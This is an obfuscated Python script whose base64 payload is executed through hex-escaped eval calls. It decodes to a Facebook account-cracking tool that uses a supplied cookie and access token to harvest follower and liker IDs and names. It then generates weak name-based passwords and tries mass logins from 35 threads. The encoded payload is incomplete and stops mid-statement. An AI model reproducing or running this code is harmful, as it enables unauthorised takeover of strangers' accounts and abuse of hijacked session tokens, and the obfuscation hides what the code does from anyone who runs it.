# Python code obfuscated by mikasataak 
 

import base64, codecs
magic = ''
love = ''
god = 'JbYm9sZCB3aGl0ZV0gICDilbDilIA+W2JvbGQgcmVkXSBDdXJzb3IgTm90IEZvdW5kISAgICAgICAgICAgICIsIGVuZD0nXHInKTt0aW1lLnNsZWVwKDIuMSkKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIDIKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICBleGNlcHQgKEtleWJvYXJkSW50ZXJydXB0KToKICAgICAgICAgICAgQ29uc29sZSgpLnByaW50KGYiW2JvbGQgd2hpdGVdICAg4pWw4pSAPltib2xkIHllbGxvd10gS2V5Ym9hcmRJbnRlcnJ1cHQhICAgICAgICAgICIsIGVuZD0nXHInKTt0aW1lLnNsZWVwKDMuNikKICAgICAgICAgICAgcmV0dXJuIDMKICAgICMjIyBEVU1QIFBFTkdJS1VUICMjIwogICAgZGVmIHBlbmdpa3V0KHNlbGYsIHVzZXJpZCwgY29va2llLCB0b2tlbl9lYWFnKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHI6CiAgICAgICAgICAgICAgICByLmhlYWRlcnMudXBkYXRlKHsKICAgICAgICAgICAgICAgICAgICAnaG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgUk1YMjE0NCBCdWlsZC9SS1ExLjIwMTIxNy4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTAzLjAuNTA2MC43MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNzUuMS4wLjI4LjExMTtdJywKICAgICAgICAgICAgICAgICAgICAnY29va2llJzogY29va2llCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjEuMC97fS9zdWJzY3JpYmVycz9hY2Nlc3NfdG9rZW49e30mcHJldHR5PTEmZmllbGRzPWlkJTJDbmFtZSZsaW1pdD01MDAwJy5mb3JtYXQodXNlcmlkLCB0b2tlbl9lYWFnKSkuanNvbigpCiAgICAgICAgICAgICAgICBpZiAnc3VtbWFyeScgaW4gc3RyKHJlc3BvbnNlKSBhbmQgJ25hbWUnIGluIHN0cihyZXNwb25zZSk6CiAgICAgICAgICAgICAgICAgICAgZm9yIHogaW4gcmVzcG9uc2VbJ2RhdGEnXToKICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5pZCwgc2VsZi5uYW1lID0gelsnaWQnXSwgelsnbmFtZSddLmxvd2VyKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHN0cihzZWxmLmlkKSBpbiBzdHIoRHVtcCk6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZSgpLnByaW50KGYiW2JvbGQgaG90X3BpbmsyXSAgIOKVsOKUgD5bYm9sZCBncmVlbl0gRHVtcCB7c2VsZi5pZH0ve2xlbihEdW1wKX0gVXNlciAgICAgICAgICIsIGVuZD0nXHInKTt0aW1lLnNsZWVwKDAuMDAwNykKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEdW1wLmFwcGVuZChmJ3tzZWxmLmlkfXx7c2VsZi5uYW1lfScpCiAgICAgICAgICAgICAgICAgICAgICAgIGV4Y2VwdCAoS2V5RXJyb3IpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgQ29uc29sZSgpLnByaW50KGYiW2JvbGQgaG90X3BpbmsyXSAgIOKVsOKUgD5bYm9sZCByZWRdIEtleUVycm9yISAgICAgICAgICAgICAgICAiLCBlbmQ9J1xyJyk7dGltZS5zbGVlcCgzLjYpO2NvbnRpbnVlCiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZSgpLnByaW50KGYiW2JvbGQgaG90X3BpbmsyXSAgIOKVsOKUgD5bYm9sZCB5ZWxsb3ddIEZhaWxlZCB7dXNlcmlkfSBVc2VycyEgICAgICAgICAgIiwgZW5kPSdccicpO3RpbWUuc2xlZXAoMy42KQogICAgICAgICAgICAgICAgICAgIHJldHVybiAxCiAgICAgICAgZXhjZXB0IChLZXlib2FyZEludGVycnVwdCk6CiAgICAgICAgICAgIENvbnNvbGUoKS5wcmludChmIltib2xkIGhvdF9waW5rMl0gICDilbDilIA+W2JvbGQgeWVsbG93XSBLZXlib2FyZEludGVycnVwdCEgICAgICAgICAgIiwgZW5kPSdccicpO3RpbWUuc2xlZXAoMy42KQogICAgICAgICAgICByZXR1cm4gMgogICAgIyMjIERVTVAgTElLRVMgIyMjCiAgICBkZWYgbGlrZXMoc2VsZiwgcG9zdGlkLCBjb29raWUsIHRva2VuX2VhYWcsIGFmdGVyKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHI6CiAgICAgICAgICAgICAgICByLmhlYWRlcnMudXBkYXRlKHsKICAgICAgICAgICAgICAgICAgICAnaG9zdCc6ICdncmFwaC5mYWNlYm9vay5jb20nLAogICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50JzogJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgUk1YMjE0NCBCdWlsZC9SS1ExLjIwMTIxNy4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTAzLjAuNTA2MC43MSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNzUuMS4wLjI4LjExMTtdJywKICAgICAgICAgICAgICAgICAgICAnY29va2llJzogY29va2llCiAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgcmVzcG9uc2UgPSByLmdldCgnaHR0cHM6Ly9ncmFwaC5mYWNlYm9vay5jb20vdjEuMC97fS9saWtlcy8/YWNjZXNzX3Rva2VuPXt9JnByZXR0eT0xJmxpbWl0PTI1JmFmdGVyPXt9Jy5mb3JtYXQocG9zdGlkLCB0b2tlbl9lYWFnLCBhZnRlcikpLmpzb24oKQogICAgICAgICAgICAgICAgaWYgJ2lkJyBpbiBzdHIocmVzcG9uc2UpIGFuZCAnbmFtZScgaW4gc3RyKHJlc3BvbnNlKToKICAgICAgICAgICAgICAgICAgICBmb3IgeiBpbiByZXNwb25zZVsnZGF0YSddOgogICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmlkLCBzZWxmLm5hbWUgPSB6WydpZCddLCB6WyduYW1lJ10ubG93ZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBzdHIoc2VsZi5pZCkgaW4gc3RyKER1bXApOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIENvbnNvbGUoKS5wcmludChmIltib2xkIGhvdF9waW5rMl0gICDilbDilIA+W2JvbGQgZ3JlZW5dIER1bXAge3NlbGYuaWR9L3tsZW4oRHVtcCl9IFVzZXIgICAgICAgICAiLCBlbmQ9J1xyJyk7dGltZS5zbGVlcCgwLjAwMDcpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBEdW1wLmFwcGVuZChmJ3tzZWxmLmlkfXx7c2VsZi5uYW1lfScpCiAgICAgICAgICAgICAgICAgICAgaWYgJ1wnYWZ0ZXJcJzonIGluIHN0cihyZXNwb25zZSk6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYubGlrZXMocG9zdGlkLCBjb29raWUsIHRva2VuX2VhYWcsIGFmdGVyID0gcmVzcG9uc2VbJ3BhZ2luZyddWydjdXJzb3JzJ11bJ2FmdGVyJ10pCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcmV0dXJuIDAKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgQ29uc29sZSgpLnByaW50KGYiW2JvbGQgd2hpdGVdICAg4pWw4pSAPltib2xkIHllbGxvd10gRmFpbGVkIHtwb3N0aWR9IFVzZXIhICAgICAgICAgICIsIGVuZD0nXHInKTt0aW1lLnNsZWVwKDMuNikKICAgICAgICAgICAgICAgICAgICByZXR1cm4gMQogICAgICAgIGV4Y2VwdCAoS2V5Ym9hcmRJbnRlcnJ1cHQpOgogICAgICAgICAgICBDb25zb2xlKCkucHJpbnQoZiJbYm9sZCBob3RfcGluazJdICAg4pWw4pSAPltib2xkIHllbGxvd10gS2V5Ym9hcmRJbnRlcnJ1cHQhICAgICAgICAgICIsIGVuZD0nXHInKTt0aW1lLnNsZWVwKDMuNikKICAgICAgICAgICAgcmV0dXJuIDIKIyMjIENSQUNLICMjIwpjbGFzcyBjcmFjazoKCiAgICBkZWYgX19pbml0X18oc2VsZikgLT4gTm9uZToKICAgICAgICBzZWxmLmNoZWNrcG9pbnQsIHNlbGYubG9vcGluZywgc2VsZi5zdWNjZXNzID0gW10sIDAsIFtdCiAgICAgICAgcGFzcwogICAgIyMjIEdFTkVSQVRFIFBBU1NXT1JEICMjIwogICAgZGVmIGdlbmVyYXRlX3Bhc3N3b3JkKHNlbGYsIG5hbWUpOgogICAgICAgIHNlbGYucGFzc3dvcmQgPSBbXQogICAgICAgIGZvciBuYW1hIGluIG5hbWUuc3BsaXQoJyAnKToKICAgICAgICAgICAgaWYgbGVuKG5hbWUpIDw9IDU6CiAgICAgICAgICAgICAgICBpZiBsZW4obmFtYSkgPCAzOgogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHNlbGYucGFzc3dvcmQuYXBwZW5kKG5hbWEgKyAnMTIzJykKICAgICAgICAgICAgICAgICAgICBzZWxmLnBhc3N3b3JkLmFwcGVuZChuYW1hICsgJzEyMzQnKQogICAgICAgICAgICAgICAgICAgIHNlbGYucGFzc3dvcmQuYXBwZW5kKG5hbWEgKyAnMTIzNDUnKQogICAgICAgICAgICAgICAgICAgIHNlbGYucGFzc3dvcmQuYXBwZW5kKG5hbWEgKyAnMTIzNDU2JykKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGlmIGxlbihuYW1hKSA8IDM6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXNzd29yZC5hcHBlbmQobmFtZSkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXNzd29yZC5hcHBlbmQobmFtZSkKICAgICAgICAgICAgICAgICAgICBzZWxmLnBhc3N3b3JkLmFwcGVuZChuYW1hICsgJzEyMycpCiAgICAgICAgICAgICAgICAgICAgc2VsZi5wYXNzd29yZC5hcHBlbmQobmFtYSArICcxMjM0JykKICAgICAgICAgICAgICAgICAgICBzZWxmLnBhc3N3b3JkLmFwcGVuZChuYW1hICsgJzEyMzQ1JykKICAgICAgICAgICAgICAgICAgICBzZWxmLnBhc3N3b3JkLmFwcGVuZChuYW1hICsgJzEyMzQ1NicpCiAgICAgICAgc2VsZi5wYXNzd29yZF8gPSBbXQogICAgICAgIGZvciB6IGluIHNlbGYucGFzc3dvcmQ6CiAgICAgICAgICAgIGlmIHN0cih6KSBpbiBzdHIoc2VsZi5wYXNzd29yZF8pOgogICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHNlbGYucGFzc3dvcmRfLmFwcGVuZCh6KQogICAgICAgIHJldHVybiBzZWxmLnBhc3N3b3JkXwogICAgIyMjIE9QRU4gTElTVCBEVU1QICMjIwogICAgZGVmIG9wZW5fbGlzdChzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIENvbnNvbGUod2lkdGg9NTAsIHN0eWxlPSJib2xkIHdoaXRlIikucHJpbnQoUGFuZWwoIiIiW2l0YWxpYyB3aGl0ZV1DcmFjayByZXN1bHRzW2l0YWxpYyBncmVlbl0gT2tbaXRhbGljIHdoaXRlXSBTYXZlZCBJbiA6W2l0YWxpYyBncmVlbl0gUmVzdWx0cy9Pay50eHQKW2l0YWxpYyB3aGl0ZV1DcmFjayByZXN1bHRzW2l0YWxpYyB2aW9sZXRdIENwW2JvbGQgd2hpdGVdIFNhdmVkIEluIDpbaXRhbGljIHZpb2xldF0gUmVzdWx0cy9DcC50eHQiIiIsIHRpdGxlPSJbaXRhbGljIHZpb2xldF0gTW9kZSBSZXN1bHQgQWt1biIpKQogICAgICAgICAgICB3aXRoIFRocmVhZFBvb2xFeGVjdXRvcihtYXhfd29ya2Vycz0zNSkgYXMgKFYpOgogICAgICAgICAgICAgICAgZm9yIHogaW4gRHVtcDoKICAgICAgICAgICAgICAgICAgICBzZWxmLmVtYWlsLCBzZWxmLm5hbWEgPSB6LnNwbGl0KCd8JylbMF0sIHouc3BsaXQoJ3wnKVsxXQogICAgICAgICAgICAgICAgICAgIHNlbGYucGFzc3dvcmQgPSBzZWxmLmdlbmVyYXRlX3Bhc3N3b3JkKHNlbGYubmFtYSkKICAgICAgICAgICAgICAgICAgICBWLnN1Ym1pdChzZWxmLm1haW4sIER1bXAsIHNlbGYuZW1haWwsIHNlbGYucGFzc3dvcmQpCiAgICAgICAgICAgIENvbnNvbGUoKS5wcmludCgiXHJbYm9sZCB3aGl0ZV1bW2JvbGQgZ3JlZW5dRG9uZVtib2xkIHdoaXRlXV0gICAgICAgICAgICAgICAgICAgICAgICAgICAiKTtleGl0KCkKICAgICAgICBleGNlcHQ6ZXhpdCgpCiAgICAjIyMgTUFJTiAjIyMKICAgIGRlZiBtYWluKHNlbGYsIHRvdGFsLCBlbWFpbCwgcGFzc3dvcmQpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZm9yIHB3cyBpbiBwYXNzd29yZDoKICAgICAgICAgICAgICAgIHNlbGYudXNlcmFnZW50ID0gc2VsZi5yZWFsbWVfdXNlcmFnZW50KHRvdGFsID0gMSkKICAgICAgICAgICAgICAgIHNlbGYudXNlcmFnZW50ID0gc2VsZi51aGRfdXNlcmFnZW50KHRvdGFsID0gMSkKICAgICAgICAgICAgICAgIHdpdGggcmVxdWVzdHMuU2Vzc2lvbigpIGFzIHI6CiAgICAgICAgICAgICAgICAgICAgci5oZWFkZXJzLnVwZGF0ZSh7CiAgICAgICAgICAgICAgICAgICAgICAgICdjb25uZWN0aW9uJzogJ2tlZXAtYWxpdmUnLAogICAgICAgICAgICAgICAgICAgICAgICAnYWNjZXB0LWxhbmd1YWdlJzogJ2lkLGVuLVVTO3E9MC45LGVuO3E9MC44JywKICAgICAgICAgICAgICAgICAgICAgICAgJ3NlYy1mZXRjaC1tb2RlJzogJ25hdmlnYXRlJywKICAgICAgICAgICAgICAgICAgICAgICAgJ2FjY2VwdCc6ICd0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjknLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNlc3QnOiAnZG9jdW1lbnQnLAogICAgICAgICAgICAgICAgICAgICAgICAnc2VjLWZldGNoLXNpdGUnOiAnbm9uZScsCiAgICAgICAgICAgICAgICAgICAgICAgICdjYWNoZS1jb250cm9sJzogJ21heC1hZ2U9MCcsCiAgICAgICAgICAgICAgICAgICAgICAgICdzZWMtZmV0Y2gtdXNlcic6ICc/MScsCiAgICAgICAgICAgICAgICAgICAgICAgICd1cGdyYWRlLWluc2VjdXJlLXJlcXVlc3RzJzogJzEnLAogICAgICAgICAgICAgICAgICAgICAgICAnaG9zdCc6ICdtLmFscGhhLmZhY2Vib29rLmNvbScsCiAgICAgICAgICAgICAgICAgICAgICAgICd1c2VyLWFnZW50Jzogc2VsZi51c2VyYWdlbnQKICAgICAgICAgICAgICAgICAgICB'
destiny = ''
joy = '\x72\x6f\x74\x31\x33'
trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
